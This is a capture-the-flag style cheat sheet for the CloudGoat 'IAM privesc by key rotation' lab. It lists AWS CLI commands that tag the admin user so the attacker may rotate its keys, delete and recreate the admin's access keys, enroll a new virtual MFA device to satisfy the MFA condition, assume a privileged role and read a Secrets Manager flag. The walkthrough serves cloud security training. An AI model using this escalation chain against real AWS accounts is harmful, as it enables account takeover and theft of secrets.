# IAM Privecs by Key Rotation Cheat Sheet

### 1. Configure AWS CLI with the Manager Profile
After launching the scenario, you will begin with an Access Key and Secret. Configure a new profile with those credentials. This ensures that all AWS commands are executed under the `manager` profile, which has specific IAM permissions.

```bash
aws configure --profile manager
```

### 2. Enumerate IAM Policies
We check the IAM policies attached to the user to understand what actions we can perform.

```bash
aws iam list-user-policies --user-name manager_iam_privesc_by_key_rotation_<cloudgoat_id> --profile manager
```
### Expected Output:
This will return policy names:
- `SelfManageAccess`
- `TagResources`

To examine these policies in detail:

```bash
aws iam get-user-policy --user-name manager_iam_privesc_by_key_rotation_<cloudgoat_id> --policy-name SelfManageAccess --profile manager

aws iam get-user-policy --user-name manager_iam_privesc_by_key_rotation_<cloudgoat_id> --policy-name TagResources --profile manager
```
- The `SelfManageAccess` policy may allow us to modify our own access.
- The `TagResources` policy could enable us to tag IAM users, which might be useful for privilege escalation.
- With these permissions, we can tag and change access keys for users with the tag `developer=true` 

### 3. Identify the Privilege Escalation Path
By examining the IAM users in the environment, we find:
- A **developer user**.
- An **admin user**, which has permission to assume a specific role:  
  `cg_secretsmanager_iam_privesc_by_key_rotation_<cloudgoat_id>`.

This role grants access to retrieve a secret flag, which is our target.

### 4. Exploit the Tagging Permission
We use our ability to tag IAM users to trick the system into giving admin privileges. Since we have permission to tag users, we tag the admin user as a developer so we can modify the admin's access keys. 

```bash
aws iam tag-user --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id> --tags '{"Key":"developer","Value":"true"}' --profile manager
```

### 5. Rotate Admin User’s Access Keys
We need to delete the admin’s current access key and create a new one. This new access key will give us full control over the admin user. 

#### 5.1: List Admin User’s Access Keys
```bash
aws iam list-access-keys --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id> --profile manager
```
#### 5.2: Delete the Old Access Key
```bash
aws iam delete-access-key --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id> --access-key-id <ACCESS_KEY_ID> --profile manager
```
#### 5.3: Create a New Access Key
```bash
aws iam create-access-key --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id> --profile manager
```

### 6. Assume the Role as Admin
Now that we have admin credentials, we configure AWS CLI with them.

```bash
aws configure --profile admin
```

Let's attempt to assume the privileged role:

```bash
aws sts assume-role --role-arn arn:aws:iam::0123456789:role/cg_secretsmanager_iam_privesc_by_key_rotation_<cloudgoat_id> --role-session-name cloudgoat_secret --profile admin
```
Note we get an **Access Denied** message because the role requires Multi-Factor Authentication (MFA) 

### 7. Create a Virtual MFA Device
To bypass the MFA requirement, we create a virtual MFA device that we can use to authenticate as the admin.

```bash
aws iam create-virtual-mfa-device --virtual-mfa-device-name cloudgoat_virtual_mfa --outfile QRCode.png --bootstrap-method QRCodePNG --profile manager
```
### Expected Output:
- `"SerialNumber": "arn:aws:iam::0123456789:mfa/cloudgoat_virtual_mfa"`

### 8. Enable MFA for the Admin User
Using the QR code generated, scan it with an MFA application (e.g., Google Authenticator).  
Then, provide two consecutive MFA tokens to enable MFA:

```bash
aws iam enable-mfa-device     --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id>     --serial-number arn:aws:iam::0123456789:mfa/cloudgoat_virtual_mfa     --authentication-code1 <MFA Code #1>     --authentication-code2 <MFA Code #2>     --profile manager
```

### 9. Assume the Role with MFA
Switch back to the admin profile (while using MFA this time):

```bash
aws sts assume-role --role-arn arn:aws:iam::0123456789:role/cg_secretsmanager_iam_privesc_by_key_rotation_<cloudgoat_id> --role-session-name cloudgoat_secret --profile admin --serial-number arn:aws:iam::0123456789:mfa/cloudgoat_virtual_mfa --token-code <TOKEN_CODE>
```
### Expected Output:
This will return temporary credentials:

```
"AccessKeyId": "ASIA..."
"SecretAccessKey": "Mm8ij9L8eV..."
"SessionToken": "IQoJb3JpZ2luX2VjE..."
```

### 10. Configure the AWS CLI with the Admin Credentials
Edit the AWS credentials file (`~/.aws/credentials`) and add

```
[admin]
aws_access_key_id = ASIA...
aws_secret_access_key = Mm8ij9L8eV...
aws_session_token = IQoJb3JpZ2luX2VjE...
```
- This allows us to use the admin credentials in subsequent AWS CLI commands.

### 11. Retrieve the Secret Flag
Now, we use our elevated privileges to retrieve the secret.

```bash
aws secretsmanager list-secrets --profile admin
```

```bash
aws secretsmanager get-secret-value --secret-id cg_secret_iam_privesc_by_key_rotation_<cloudgoat_id> --profile admin | grep flag
```

## Recap
By leveraging misconfigured IAM permissions, we:
1. Used our ability to tag IAM users to escalate privileges.
2. Rotated the admin’s access key to gain control.
3. Enabled MFA to bypass security restrictions.
4. Assumed a privileged role and retrieved the secret flag.

